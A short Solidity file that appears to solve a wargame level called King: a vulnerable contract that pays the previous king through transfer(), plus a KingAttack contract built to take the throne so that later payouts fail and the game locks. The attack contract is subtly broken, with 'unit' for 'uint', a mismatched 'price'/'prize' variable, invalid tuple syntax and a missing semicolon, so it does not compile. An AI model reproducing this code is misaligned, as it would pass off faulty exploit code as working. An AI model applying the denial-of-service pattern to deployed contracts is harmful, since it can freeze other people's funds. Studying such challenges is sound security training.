// SPDX-License-Identifier: MIT
// 0x813b178901eb8E4d9292d94b62B43a7a240aB18C
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract KingAttack {
    constructor(address kingAddr) payable {
        King king = King(kingAddr);
        unit price = king.prize();
        (bool ok, _) = kingAddr.call{value: prize}("");
        require(ok, "fail")
    }
}